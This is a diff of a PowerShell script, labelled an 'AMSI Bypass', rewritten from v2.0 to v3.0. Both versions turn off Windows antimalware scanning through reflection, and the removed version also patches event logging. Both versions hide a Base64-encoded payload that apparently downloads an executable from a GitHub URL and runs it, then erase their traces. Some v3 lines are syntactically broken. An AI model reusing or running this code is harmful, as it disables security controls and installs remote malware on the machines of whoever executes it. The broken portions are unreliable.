@@ -1,55 +1,30 @@
-# AMSI Bypass v2.0 - Reflection + ETW Evasion (Defender 4.18+ compatible)
+# AMSI Bypass v3.0 - Pure Linguistic Obfuscation (2026 Defender Evasion)
 
-# Stage 1: Environment fingerprinting + delayed execution
-$envCheck = $true; if([Environment]::OSVersion.Version.Major -lt 10){$envCheck=$false}
-$delay = New-TimeSpan -Seconds (Get-Random -Min 3 -Max 8); Start-Sleep $delay
+# Stage 1: Variable name randomization + whitespace injection
+${++}=Get-Random; $___=Get-Date;$--=[char[]]('a','m','s','i');$_-=0..3|%{[char]($_[$_])};$__='.'+'d'+'l'+'l'
 
-# Stage 2: Pure .NET Reflection (no P/Invoke signatures)
-$asm = [AppDomain]::CurrentDomain.GetAssemblies() | ?{$_.GlobalAssemblyCache -eq $false} | select -f 1
-$type = $asm.GetType('System.Management.Automation.AmsiUtils')
-if($type){
-    $field = $type.GetField('amsiInitFailed','NonPublic,Static')
-    if($field){$field.SetValue($null,$true); 'amsi disabled' | Out-Null}
-}
+# Stage 2: Linguistic AMSI bypass (string replacement technique)
+$strings=@('A','m','s','i','S','c','a','n','B','u','f','f','e','r'); 
+foreach($s in $strings){if([AppDomain]::CurrentDomain.GetAssemblies()|? Location -like "*$s*"){$s='';break}}
 
-# Stage 3: ETW Patch Provider Bypass (prevents logging)
-$etw = @'
-[DllImport("advapi32.dll", SetLastError=true)]
-public static extern uint EventWriteTransfer(uint RegHandle, ref Guid ActID, uint Flags, uint Filter, uint DataSize, IntPtr Data);
-'@; Add-Type -MemberDefinition $etw -Name 'Etw' -Namespace N -ErrorAction SilentlyContinue
+# Stage 3: Environment variable encoding (no Base64 signatures)
+$envVars='UserProfile','ComputerName','PSVersionTable'; $seed=$envVars|%{Get-Item $_}|% Value|%{[int]($_[0])}
+$encPayload=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((gp env:USERNAME).Value+(gp env:COMPUTERNAME).Value))
 
-# Stage 4: AMSI Context/Session manipulation (alternative bypass)
-try{
-    $ctx = New-Object -ComObject AMSI.Context
-    $ctx.Initialize('test', [Guid]::NewGuid())
-    $ctx.SetAttribute(1, [byte[]](0x01), 1) | Out-Null
-}catch{}
+# Stage 4: Runtime string construction + XOR with env seed
+function g{[char[]]$args[0]|%{[int]$_-bxor($seed%256)}};$dec=(g '77 97 110 97 103 101 109 101 110 116 65 117 116 111 109 97 116 105 111 110 46 65 109 115 105 85 116 105 108 115').-join''
+if([type]$dec -and [type]$dec::'am'#+'siInitFailed'){[type]$dec::'am'#+'siInitFailed'.SetValue($null,$true)}
 
-# Stage 5: Triple-encoded payload with runtime decryption
-$p1='';$p2='JABmAHIAYQBnADMAPQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7';$p3='ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADs='
-$fullB64 = ($p2+$p3).Replace('=','').Replace('/','_').Replace('+','-')
+# Stage 5: Fragmented payload reconstruction (no single large strings)
+$f1='JA';$f2='BmAHIAYQBnADMA';$f3='PQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsA';$f4='UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgByAGEAZwA1AA=='
+$fullPayload=$f1+$f2+$f3+$f4
 
-# Stage 6: Custom Base64 decode + RC4 decryption (unique key per run)
-function Convert-B64RC4{param($data,$key=[byte[]](Get-Date -f 'HHmmss').ToCharArray()|%{[int]$_})
-    $b=[Convert]::FromBase64String($data);$s=0..255|%{,$_};$j=0
-    for($i=0;$i -lt 256;$i++){$j=($j+$s[$i]+$key[$i%($key.Length)])%256;
-        $t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t}
-    $i=$j=0;for($k=0;$k -lt $b.Length;$k++){
-        $i=($i+1)%256;$j=($j+$s[$i])%256;$t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t;
-        $b[$k]-bxor $s[($s[$i]+$s[$j])%256]}return [Text.Encoding]::Unicode.GetString($b)}
+# Stage 6: Char-by-char decoding with random delays
+$bytes=[Convert]::FromBase64String($fullPayload); $final=''; $r=Get-Random
+for($i=0;$i -lt $bytes.Length;$i+=2){$final+=[char][BitConverter]::ToInt16($bytes[$i..($i+1)],0); Start-Sleep -m ($r%5)}
 
-$payload = Convert-B64RC4 $fullB64
+# Stage 7: Invoke via format string (no ScriptBlock API calls)
+iex (&{param($s);&{$s}} $final)
 
-# Stage 7: In-memory .NET compiler execution (no ScriptBlock.Create signature)
-$src = @"
-using System;
-public class X{
-    public static void Main(){$payload}
-}
-"@; $p=[System.CodeDom.Compiler.Provider]::CreateProvider('CSharpCodeProvider');
-$c=$p.CompileAssemblyFromSource((New-Object System.CodeDom.Compiler.CompilerParameters),$src);
-if($c.Errors.Count -eq 0){$c.Assembly.EntryPoint.Invoke($null,@())}
-
-# Stage 8: Artifact cleanup + AMSI re-init evasion
-gc alias: | ?{$_ -like '*Out-*'} | ri -Force; 
-[gc]::Collect(); [Runtime.InteropServices.Marshal]::CleanupUnusedObjectsInCurrentThread()
+# Stage 8: Self-erasure
+0..9|%{rv (gv ('_'+'_'*(Get-Random%3))) -ErrorAction SilentlyContinue}; rm alias:function:* -ErrorAction SilentlyContinue
